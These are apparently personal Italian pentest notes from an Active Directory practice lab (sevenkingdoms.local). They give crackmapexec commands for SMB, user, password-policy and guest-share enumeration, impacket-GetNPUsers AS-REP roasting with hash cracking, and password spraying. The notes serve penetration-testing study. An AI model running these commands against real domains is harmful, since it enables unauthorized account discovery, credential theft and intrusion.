### **SUBNET ENUM**
Inizio enumerando l'intera subnet con cme alla ricerca du samba
```bash
crackmapexec smb 192.168.56.0/24
```
![[Pasted image 20230810122313.png]]
Ora trovo gli ip dei DC per configurare /etc/hosts e capire la topologia
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```
cambia ogni volta il nome del dominio
![[Pasted image 20230810124141.png]]
quindi modifico /etc/hosts per risolvere gli indirizzi
![[Pasted image 20230810124229.png]]

### **USER ENUM (NO CREDS)**
Enumero gli user presenti su ogni macchine
```bash
crackmapexec smb 192.168.56.11 --users
```
Ha SAMRPC attivo e quindi potrò enumerare gli user
![[Pasted image 20230810163553.png]]
Ho ottenuto anche una password trovata nella descrizione negli user

Puoi anche ottenere la policy della password per provare del bruteforce
```bash
crackmapexec smb 192.168.56.11 --pass-pol
```
![[Pasted image 20230810164319.png]]
Potresti usare anche enu4linux ma non ho voglia

### **SHARE SMB (NO CREDS)**
Enumeriamo gli share di smb su cui abbiamo qualche permesso come anonimo
```bash
crackmapexec smb 192.168.56.10-23 -u 'guest' -p '' --shares
```
![[Pasted image 20230810165921.png]]
cioccato

### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
![[Pasted image 20230810171242.png]]
cracca l'hash
![[Pasted image 20230810171924.png]]

### **Password Spraying**
==OCCHIO ALLE POLICY DELLE PASSWORD PERCHE POTRESTI LOCKARE LE PASSWORD==
```bash
crackmapexec smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce
```
![[Pasted image 20230810172208.png]]